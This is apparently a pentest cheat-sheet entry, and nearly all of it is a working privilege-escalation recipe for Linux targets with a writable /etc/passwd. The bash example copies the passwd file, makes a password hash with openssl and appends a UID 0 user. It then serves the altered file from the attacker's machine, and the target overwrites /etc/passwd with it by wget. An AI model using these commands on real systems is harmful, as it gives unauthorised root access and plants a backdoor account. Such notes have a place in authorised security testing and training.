# passwd

If you can write to /etc/passwd on your target, you can escelate your privileges to root bei adding a new user.

## Example
```bash
# on target

cat /etc/passwd > passwd2

# on host

wget $TARGET/passwd2

openssl passwd 'P@ssW0rd'

$1$CfB6T.JH$U6Jbqet3kChlXCWzRAu7y0

echo 'newuser:$1$CfB6T.JH$U6Jbqet3kChlXCWzRAu7y0:0:0:root:/root:/bin/bash' >> passwd2

mv passwd2 passwd

python3 -m http.server 8080

# on target

cd /etc

wget http://$HOST/passwd
```